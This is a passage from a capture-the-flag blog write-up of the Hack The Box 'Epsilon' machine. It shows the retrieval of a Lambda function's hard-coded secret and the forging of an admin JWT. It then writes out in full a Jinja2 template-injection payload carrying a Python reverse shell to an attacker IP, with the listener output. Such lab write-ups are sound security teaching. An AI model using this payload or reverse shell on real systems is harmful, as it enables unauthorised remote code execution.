<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">export AWS_ACCESS_KEY_ID<span style="color:#f92672">=</span>AQLA5M37BDN6FJP76TDC                                                                                    
export AWS_SECRET_ACCESS_KEY<span style="color:#f92672">=</span>OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A  
export AWS_REGION<span style="color:#f92672">=</span>us-east-1

aws --endpoint-url<span style="color:#f92672">=</span>http://cloud.epsilon.htb/ lambda list-functions

<span style="color:#f92672">{</span>
    <span style="color:#e6db74">&#34;Functions&#34;</span>: <span style="color:#f92672">[</span>
        <span style="color:#f92672">{</span>
            <span style="color:#e6db74">&#34;FunctionName&#34;</span>: <span style="color:#e6db74">&#34;costume_shop_v1&#34;</span>,
            <span style="color:#e6db74">&#34;FunctionArn&#34;</span>: <span style="color:#e6db74">&#34;arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1&#34;</span>,
            <span style="color:#e6db74">&#34;Runtime&#34;</span>: <span style="color:#e6db74">&#34;python3.7&#34;</span>,
            <span style="color:#e6db74">&#34;Role&#34;</span>: <span style="color:#e6db74">&#34;arn:aws:iam::123456789012:role/service-role/dev&#34;</span>,
            <span style="color:#e6db74">&#34;Handler&#34;</span>: <span style="color:#e6db74">&#34;my-function.handler&#34;</span>,
            <span style="color:#e6db74">&#34;CodeSize&#34;</span>: 478,
            <span style="color:#e6db74">&#34;Description&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
            <span style="color:#e6db74">&#34;Timeout&#34;</span>: 3,
            <span style="color:#e6db74">&#34;LastModified&#34;</span>: <span style="color:#e6db74">&#34;2021-11-24T07:24:25.324+0000&#34;</span>,
            <span style="color:#e6db74">&#34;CodeSha256&#34;</span>: <span style="color:#e6db74">&#34;IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=&#34;</span>,
            <span style="color:#e6db74">&#34;Version&#34;</span>: <span style="color:#e6db74">&#34;</span>$LATEST<span style="color:#e6db74">&#34;</span>,
            <span style="color:#e6db74">&#34;VpcConfig&#34;</span>: <span style="color:#f92672">{}</span>,
            <span style="color:#e6db74">&#34;TracingConfig&#34;</span>: <span style="color:#f92672">{</span>
                <span style="color:#e6db74">&#34;Mode&#34;</span>: <span style="color:#e6db74">&#34;PassThrough&#34;</span>
            <span style="color:#f92672">}</span>,
            <span style="color:#e6db74">&#34;RevisionId&#34;</span>: <span style="color:#e6db74">&#34;78b95307-f240-40d3-acd2-373ddccfdbe2&#34;</span>,
            <span style="color:#e6db74">&#34;State&#34;</span>: <span style="color:#e6db74">&#34;Active&#34;</span>,
            <span style="color:#e6db74">&#34;LastUpdateStatus&#34;</span>: <span style="color:#e6db74">&#34;Successful&#34;</span>,
            <span style="color:#e6db74">&#34;PackageType&#34;</span>: <span style="color:#e6db74">&#34;Zip&#34;</span>
        <span style="color:#f92672">}</span>
    <span style="color:#f92672">]</span>
<span style="color:#f92672">}</span>

aws --endpoint-url<span style="color:#f92672">=</span>http://cloud.epsilon.htb/ lambda get-function --function-name costume_shop_v1

<span style="color:#f92672">}</span>,
    <span style="color:#e6db74">&#34;Code&#34;</span>: <span style="color:#f92672">{</span>
        <span style="color:#e6db74">&#34;Location&#34;</span>: <span style="color:#e6db74">&#34;http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code&#34;</span>
    <span style="color:#f92672">}</span>,
    <span style="color:#e6db74">&#34;Tags&#34;</span>: <span style="color:#f92672">{}</span>

</code></pre></div><p>Visit url and get the function</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> json

secret<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;RrXCv`mrNe!K!4+5`wYq&#39;</span> <span style="color:#75715e">#apigateway authorization for CR-124</span>

<span style="color:#e6db74">&#39;&#39;&#39;Beta release for tracking&#39;&#39;&#39;</span>
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">lambda_handler</span>(event, context):
    <span style="color:#66d9ef">try</span>:
        id<span style="color:#f92672">=</span>event[<span style="color:#e6db74">&#39;queryStringParameters&#39;</span>][<span style="color:#e6db74">&#39;order_id&#39;</span>]
        <span style="color:#66d9ef">if</span> id:
            <span style="color:#66d9ef">return</span> {
               <span style="color:#e6db74">&#39;statusCode&#39;</span>: <span style="color:#ae81ff">200</span>,
               <span style="color:#e6db74">&#39;body&#39;</span>: json<span style="color:#f92672">.</span>dumps(str(resp)) <span style="color:#75715e">#dynamodb tracking for CR-342</span>
            }
        <span style="color:#66d9ef">else</span>:
            <span style="color:#66d9ef">return</span> {
                <span style="color:#e6db74">&#39;statusCode&#39;</span>: <span style="color:#ae81ff">500</span>,
                <span style="color:#e6db74">&#39;body&#39;</span>: json<span style="color:#f92672">.</span>dumps(<span style="color:#e6db74">&#39;Invalid Order ID&#39;</span>)
            }
    <span style="color:#66d9ef">except</span>:
        <span style="color:#66d9ef">return</span> {
                <span style="color:#e6db74">&#39;statusCode&#39;</span>: <span style="color:#ae81ff">500</span>,
                <span style="color:#e6db74">&#39;body&#39;</span>: json<span style="color:#f92672">.</span>dumps(<span style="color:#e6db74">&#39;Invalid Order ID&#39;</span>)
            }

</code></pre></div><p>we can use this secret to login admin in app port 5000. Craft jwt in <a href="https://jwt.io/#debugger">https://jwt.io/#debugger</a> with private key and get authorization.</p>
<p><img src="/img/htb_epsilon_jwt.png" alt=""></p>
<p>Get admin page</p>
<p><img src="/img/htb_epsilon_admin.png" alt=""></p>
<p>In Order page, input costume is reflected, because this web using flask, i suspect we can SSTI from that.</p>
<p><img src="/img/htb_epsilon_order1.png" alt=""></p>
<p><img src="/img/htb_epsilon_order2.png" alt=""></p>
<p>Get RCE :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">POST <span style="color:#f92672">/</span>order<span style="color:#960050;background-color:#1e0010">?</span>input<span style="color:#f92672">=</span>python3<span style="color:#f92672">+-</span>c<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;import+socket,subprocess,os%3bs</span><span style="color:#e6db74">%3d</span><span style="color:#e6db74">socket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect((&#34;10.10.14.3&#34;,9000))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3bos.dup2(s.fileno(),2)%3bimport+pty%3b+pty.spawn(&#34;sh&#34;)&#39;</span> HTTP<span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
Host: <span style="color:#ae81ff">10.129.96.99</span>:<span style="color:#ae81ff">5000</span>
Content<span style="color:#f92672">-</span>Length: <span style="color:#ae81ff">220</span>
Cache<span style="color:#f92672">-</span>Control: max<span style="color:#f92672">-</span>age<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
Upgrade<span style="color:#f92672">-</span>Insecure<span style="color:#f92672">-</span>Requests: <span style="color:#ae81ff">1</span>
Origin: http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span>:<span style="color:#ae81ff">5000</span>
Content<span style="color:#f92672">-</span>Type: application<span style="color:#f92672">/</span>x<span style="color:#f92672">-</span>www<span style="color:#f92672">-</span>form<span style="color:#f92672">-</span>urlencoded
User<span style="color:#f92672">-</span>Agent: Mozilla<span style="color:#f92672">/</span><span style="color:#ae81ff">5.0</span> (X11; Linux x86_64) AppleWebKit<span style="color:#f92672">/</span><span style="color:#ae81ff">537.36</span> (KHTML, like Gecko) Chrome<span style="color:#f92672">/</span><span style="color:#ae81ff">96.0.4664.45</span> Safari<span style="color:#f92672">/</span><span style="color:#ae81ff">537.36</span>
Accept: text<span style="color:#f92672">/</span>html,application<span style="color:#f92672">/</span>xhtml<span style="color:#f92672">+</span>xml,application<span style="color:#f92672">/</span>xml;q<span style="color:#f92672">=</span><span style="color:#ae81ff">0.9</span>,image<span style="color:#f92672">/</span>avif,image<span style="color:#f92672">/</span>webp,image<span style="color:#f92672">/</span>apng,<span style="color:#f92672">*/*</span>;q<span style="color:#f92672">=</span><span style="color:#ae81ff">0.8</span>,application<span style="color:#f92672">/</span>signed<span style="color:#f92672">-</span>exchange;v<span style="color:#f92672">=</span>b3;q<span style="color:#f92672">=</span><span style="color:#ae81ff">0.9</span>
Referer: http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span>:<span style="color:#ae81ff">5000</span><span style="color:#f92672">/</span>order
Accept<span style="color:#f92672">-</span>Encoding: gzip, deflate
Cookie: auth<span style="color:#f92672">=</span>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9<span style="color:#f92672">.</span>eyJ1c2VybmFtZSI6ImFkbWluIn0<span style="color:#f92672">.</span>WFYEm2<span style="color:#f92672">-</span>bZZxe2qpoAtRPBaoNekx<span style="color:#f92672">-</span>oOwueA80zzb3Rc4
Accept<span style="color:#f92672">-</span>Language: en<span style="color:#f92672">-</span>US,en;q<span style="color:#f92672">=</span><span style="color:#ae81ff">0.9</span>,id;q<span style="color:#f92672">=</span><span style="color:#ae81ff">0.8</span>,ms;q<span style="color:#f92672">=</span><span style="color:#ae81ff">0.7</span>
Connection: close

costume<span style="color:#f92672">=</span>{<span style="color:#f92672">%</span><span style="color:#ae81ff">25</span><span style="color:#f92672">+</span><span style="color:#66d9ef">for</span><span style="color:#f92672">+</span>x<span style="color:#f92672">+</span><span style="color:#f92672">in</span><span style="color:#f92672">+</span>()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()<span style="color:#f92672">+%</span><span style="color:#ae81ff">25</span>}{<span style="color:#f92672">%</span><span style="color:#ae81ff">25</span><span style="color:#f92672">+</span><span style="color:#66d9ef">if</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;warning&#34;</span><span style="color:#f92672">+</span><span style="color:#f92672">in</span><span style="color:#f92672">+</span>x<span style="color:#f92672">.</span>__name__<span style="color:#f92672">+%</span><span style="color:#ae81ff">25</span>}{{x()<span style="color:#f92672">.</span>_module<span style="color:#f92672">.</span>__builtins__[<span style="color:#e6db74">&#39;__import__&#39;</span>](<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>input)<span style="color:#f92672">.</span>read()}}{<span style="color:#f92672">%</span><span style="color:#ae81ff">25</span>endif<span style="color:#f92672">%</span><span style="color:#ae81ff">25</span>}{<span style="color:#f92672">%</span><span style="color:#ae81ff">25</span>endfor<span style="color:#f92672">%</span><span style="color:#ae81ff">25</span>}<span style="color:#f92672">&amp;</span>q<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&amp;</span>addr<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>

nc <span style="color:#f92672">-</span>lnvp <span style="color:#ae81ff">9000</span>
Listening on <span style="color:#ae81ff">0.0.0.0</span> <span style="color:#ae81ff">9000</span>
Connection received on <span style="color:#ae81ff">10.129.96.99</span> <span style="color:#ae81ff">38578</span>
<span style="color:#960050;background-color:#1e0010">$</span> ls
ls
app<span style="color:#f92672">.</span>py  static  templates
<span style="color:#960050;background-color:#1e0010">$</span> cd <span style="color:#f92672">..</span>
cd <span style="color:#f92672">..</span>
l<span style="color:#960050;background-color:#1e0010">$</span> s
ls
app  flag<span style="color:#f92672">.</span>txt  html
<span style="color:#960050;background-color:#1e0010">$</span> cat flag<span style="color:#f92672">.</span>txt
cat flag<span style="color:#f92672">.</span>txt
HTB{l4mbd4_l34ks_4r3_fun<span style="color:#960050;background-color:#1e0010">!!!</span>}<span style="color:#960050;background-color:#1e0010">$</span>


</code></pre></div><p>FLAG : <code>HTB{l4mbd4_l34ks_4r3_fun!!!}</code></p>

            </div>
        </article>

        <hr />

        <div class="post-info">
                <p>
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="/tags/writeup">writeup</a></span><span class="tag"><a href="/tags/ctf">ctf</a></span><span class="tag"><a href="/tags/cloud">cloud</a></span>
                </p>

            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>900 Words</p>

            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2021-11-24 14:21 &#43;0700</p>
        </div>

        
            <div class="pagination">
                <div class="pagination__title">
                    <span class="pagination__title-h">Read other posts</span>
                    <hr />
                </div>

                <div class="pagination__buttons">
                    

                    
                        <span class="button next">
                            <a href="/posts/htb-uni-ctf-steamcloud-writeup/">
                                <span class="button__text">HTB UNI CTF - Cloud - SteamCloud Writeup</span>
                                <span class="button__icon">â†’</span>
                            </a>
                        </span>
                    
                </div>
            </div>
        

        	
<div id="comments" class="thin">
      		    <div id="disqus_thread"></div>
<script type="text/javascript">

(function() {
      
      
      if (window.location.hostname == "localhost")
                return;

      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      var disqus_shortname = 'dmcr7';
      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="http://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>


      		</div>
    </main>

            </div>

            
                <footer class="footer">
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2021</span>
            
            <span></span>
            <span> <a href="/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
        </div>
    </div>

    <div class="footer__inner">
        <div class="footer__content">

        </div>
    </div>
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
            <span>Made with &#10084; by <a href="https://github.com/rhazdon">rhazdon</a></span>
        </div>
    </div>


</footer>

            
        </div>

        




<script type="text/javascript" src="/bundle.min.766584e6ea536f54faf86b018d73f719fc520199a6c4d32cbd959eb87634c11b380ac646d80d67304313aac0f5f05e6715221bd99a619bbc905365b55f78147f.js" integrity="sha512-dmWE5upTb1T6&#43;GsBjXP3GfxSAZmmxNMsvZWeuHY0wRs4CsZG2A1nMEMTqsD18F5nFSIb2Zphm7yQU2W1X3gUfw=="></script>



    </body>
</html>
